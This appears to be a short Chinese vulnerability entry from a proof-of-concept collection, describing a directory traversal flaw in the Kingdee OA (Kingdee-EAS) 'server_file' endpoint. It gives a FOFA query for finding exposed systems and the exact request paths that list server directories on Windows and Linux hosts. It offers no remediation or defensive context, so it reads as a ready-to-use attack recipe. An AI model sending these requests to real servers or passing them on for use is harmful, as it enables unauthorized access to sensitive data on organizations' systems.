# 金蝶OA server_file 目录遍历漏洞

## 漏洞描述

金蝶OA server_file 存在目录遍历漏洞，攻击者通过目录遍历可以获取服务器敏感信息

## 漏洞影响

```
金蝶OA
```

## FOFA

```
app="Kingdee-EAS"
```

## 漏洞复现

登录界面为



![1](./images/202202090144781.png)

漏洞POC

```plain
/appmonitor/protected/selector/server_file/files?folder=/&suffix=

# Windows服务器
appmonitor/protected/selector/server_file/files?folder=C://&suffix=

# Linux服务器
appmonitor/protected/selector/server_file/files?folder=/&suffix=
```

![2](./images/202202090144057.png)